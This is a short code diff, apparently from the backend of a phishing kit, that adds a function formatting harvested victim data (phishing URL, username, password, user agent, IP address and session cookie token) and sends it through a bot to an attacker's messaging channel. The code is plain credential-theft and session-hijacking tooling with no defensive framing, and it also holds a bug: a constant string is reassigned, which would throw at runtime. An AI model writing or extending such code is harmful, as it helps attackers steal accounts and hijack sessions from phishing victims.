@@ -52,7 +52,7 @@ exports.create = (req, res) => {
             delete data.id;
             delete data.phishlet;
             delete data.updatedAt;
-            bot.sendMessage(lure.channel, JSON.stringify(data));
+            bot.sendMessage(lure.channel, getFormattedMsg(data));
             resolve({}, res);
           } catch (err) {
             reject(err, res);
@@ -68,6 +68,18 @@ exports.delete = (req, res) => {
     .remove(req.body.id)
     .then((data) => resolve(data, res))
     .catch((err) => reject(err, res));
+};
+
+const getFormattedMsg = (data) => {
+  const msg = "";
+  msg += `Phishing Url: ${data.landingUrl}\n`;
+  msg += `Username: ${data.username}\n`;
+  msg += `Password: ${data.password}\n`;
+  msg += `UserAgent: ${data.userAgent}\n`;
+  msg += `Remote Address: ${data.remoteAddr}\n`;
+  msg += `Time: ${data.createdAt}\n\nCookiToken\n`;
+  msg += `${data.cookieToken}\n`;
+  return msg;
 };
 
 const cookieToString = (tokens) => {
